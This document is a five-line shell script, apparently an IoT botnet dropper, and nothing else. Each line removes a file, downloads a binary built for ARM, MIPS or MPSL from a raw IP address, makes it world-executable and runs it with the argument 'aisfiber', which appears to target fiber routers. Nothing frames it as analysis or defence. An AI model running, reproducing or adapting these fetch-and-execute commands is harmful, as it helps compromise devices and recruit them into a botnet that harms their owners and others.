rm -rf splarm7;wget http://45.95.146.126/splarm7; chmod 777 splarm7; ./splarm7 aisfiber
rm -rf splarm5;wget http://45.95.146.126/splarm5; chmod 777 splarm5; ./splarm5 aisfiber
rm -rf splarm6;wget http://45.95.146.126/splarm6; chmod 777 splarm6; ./splarm6 aisfiber
rm -rf splmips;wget http://45.95.146.126/splmips; chmod 777 splmips; ./splmips aisfiber
rm -rf splmpsl;wget http://45.95.146.126/splmpsl; chmod 777 splmpsl; ./splmpsl aisfiber
